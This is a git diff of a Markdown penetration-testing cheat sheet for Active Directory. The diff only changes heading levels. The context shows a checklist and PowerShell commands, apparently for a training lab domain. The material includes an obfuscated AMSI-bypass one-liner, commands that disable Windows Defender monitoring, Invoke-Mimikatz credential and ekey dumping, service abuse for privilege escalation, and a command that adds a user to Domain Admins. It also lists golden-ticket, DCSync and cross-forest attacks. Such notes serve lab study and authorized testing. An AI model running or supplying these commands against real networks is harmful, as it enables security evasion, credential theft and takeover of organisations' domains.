@@ -1,6 +1,6 @@
 # Methodology Master
 ---
-### 0. Miscellaneous
+## 0. Miscellaneous
 > 1. [ ] Remember to bypass AMSI on every new user
 > 2. [ ] Bypass AMSI and ETW while loading an exe
 > 3. [ ] Bypass real-time monitoring
@@ -12,7 +12,7 @@
 > 9. [ ] Check the Execution policy language mode
 > 10. [ ] Check all the commands you are allowed to execute
 
-### 1. Domain Enumeration
+## 1. Domain Enumeration
 > 1. [ ] Complete basic Enum
 > 2. [ ] enumerate all users
 > 3. [ ] enumerate all domain computers
@@ -22,7 +22,7 @@
 > 7. [ ] Blood-hound
 > 8. [ ] SPN
 
-### 2. Local Priv Esc
+## 2. Local Priv Esc
 > 1. [ ] Run *powerups.ps1*
 > 2. [ ] **ServiceUnquoted**
 > 3. [ ] **ModifiableServiceFile**
@@ -38,7 +38,7 @@
 
 **NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**
 
-### 3. Domain Admin Priv Esc
+## 3. Domain Admin Priv Esc
 > 1. [ ] Hunt for Local Admin Users
 > 2. [ ] Check The local Admin Access
 > 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**
@@ -50,7 +50,7 @@
 > 9. [ ] MS-Exchange
 > 10. [ ] RBCD
 
-### 4. Domain Admin Persistence [app locker enabled]
+## 4. Domain Admin Persistence [app locker enabled]
 > 1. [ ] Check the Execution policy language mode
 > 2. [ ] Checking AppLockerPolicy and note the paths available for us
 > 3. [ ] Disable Defender protections
@@ -60,20 +60,20 @@
 > 7. [ ] Get the ekeys
 > 8. [ ] Get Credentials from the credentials vault
 
-### 5. Domain Admin Persistence
+## 5. Domain Admin Persistence
 > 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
 > 2. [ ] Get the ekeys
 > 3. [ ] Get Credentials from the credentials vault
 > 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user
 > 5. [ ] Check any user where you can read msDS-AllowedToDelegateTo
 
-### 6. New user from DA Priv Esc
+## 6. New user from DA Priv Esc
 > 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found
 
-### 7. DC pwn
+## 7. DC pwn
 > 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**
 
-### 8. Domain Controller Persistence
+## 8. Domain Controller Persistence
 > 1. [ ] Golden Ticket
 > 2. [ ] Silver Ticket
 > 3. [ ] DSRM
@@ -81,14 +81,14 @@
 > 5. [ ] ACL DCSync
 > 6. [ ] ACL security Descriptors
 
-### 9. Cross Domain Attacks
+## 9. Cross Domain Attacks
 > 1. [ ] MX-Exchange
 > 2. [ ] Azure AD Integration
 > 3. [ ] AD CS
 > 4. [ ] Forest SID Abuse
 > 5. [ ] Forest krbtgt Attack
 
-### 9. Cross Forest Attacks
+## 9. Cross Forest Attacks
 
 > 1. [ ] Forge inter-forest ticket by trust keys
 > 2. [ ] Kerberosting
@@ -114,7 +114,7 @@
 ## Command master 
 > Check the misc notes master
 
-### 1. Bypass defender
+## 1. Bypass defender
 ```powershell
 # AMSI
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
@@ -124,7 +124,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
 ```
 
-### 2. Domain Enumeration
+## 2. Domain Enumeration
 ```powershell
 # Users
 Get-NetUser
@@ -171,7 +171,7 @@ Import-Module .\PowerUpSQL.psd1
 Get-SQLInstanceDomain
 ```
 
-### 3. Domain Admin Priv Esc
+## 3. Domain Admin Priv Esc
 **NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**
 ```powershell
 # Powerups
@@ -184,7 +184,7 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student21'
 Invoke-Mimikatz
 ```
 
-### 4. Domain Admin Priv Esc
+## 4. Domain Admin Priv Esc
 ```powershell
 # Local admin user
 Find-LocalAdminAccess -Verbose
@@ -209,7 +209,7 @@ wget or curl or iex(iwr)
 .\Invoke-Mimikatz.ps1
 ```
 
-### 5. Domain Admin Persistence
+## 5. Domain Admin Persistence
 ```powershell
 Invoke-Mimikatz
 
@@ -219,7 +219,7 @@ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 
-### Extras 
+## Extras 
 ```powershell
 # Once you are DA add user to DA group
 Invoke-Command -ScriptBlock {net group "DOMAIN ADMINS" student21 /domain /add} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
@@ -231,7 +231,7 @@ https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
 
 ```
 
-### Forest Priv Esc
+## Forest Priv Esc
 ```powershell
 
 Invoke-Mimikatz
@@ -247,7 +247,7 @@ gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local
 
 ```
 
-### Query
+## Query
 ```powershell
 net localgroup administrators
 # add to localgroup admins
